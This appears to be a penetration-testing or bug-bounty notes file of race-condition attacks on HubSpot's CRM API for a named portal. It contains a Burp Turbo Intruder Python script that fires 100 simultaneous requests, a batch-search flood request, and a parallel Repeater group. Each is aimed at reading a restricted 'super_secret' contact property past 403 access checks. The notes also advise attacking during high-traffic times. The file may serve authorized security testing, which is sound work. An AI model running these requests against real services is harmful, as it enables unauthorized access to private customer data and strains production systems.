# ========================================
# RACE CONDITION TESTING
# Use Burp Turbo Intruder for these
# ========================================

# TURBO INTRUDER SCRIPT 1: Parallel Requests
# Use Turbo Intruder extension with this request:
GET /crm/v3/objects/contacts/1?portalId=46962361&properties=firstname,super_secret,email HTTP/2
Host: api.hubapi.com
Authorization: Bearer YOUR_API_KEY_HERE
Content-Type: application/json

# Python script for Turbo Intruder:
"""
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)

    # Send 100 identical requests simultaneously
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if req.status != 403:
        table.add(req)
"""


# TURBO INTRUDER SCRIPT 2: Batch Search Flood
POST /crm/v3/objects/contacts/search?portalId=46962361 HTTP/2
Host: api.hubapi.com
Authorization: Bearer YOUR_API_KEY_HERE
Content-Type: application/json

{"filterGroups":[{"filters":[{"propertyName":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"limit":100}

# Same Turbo Intruder config


# BURP REPEATER GROUP: Sequential Race
# Create a group with these requests and send in parallel:

# Request 1:
GET /crm/v3/objects/contacts/1?portalId=46962361&properties=firstname HTTP/2
Host: api.hubapi.com
Authorization: Bearer YOUR_API_KEY_HERE
Content-Type: application/json

# Request 2:
GET /crm/v3/objects/contacts/1?portalId=46962361&properties=super_secret HTTP/2
Host: api.hubapi.com
Authorization: Bearer YOUR_API_KEY_HERE
Content-Type: application/json

# Request 3:
GET /crm/v3/objects/contacts/1?portalId=46962361&properties=email HTTP/2
Host: api.hubapi.com
Authorization: Bearer YOUR_API_KEY_HERE
Content-Type: application/json


# NOTES FOR RACE CONDITIONS:
# - Send 50-100 requests simultaneously
# - Look for ANY request that doesn't return 403
# - Even if one request succeeds, that's the vulnerability
# - Try during high traffic times
# - Try with different API endpoints simultaneously
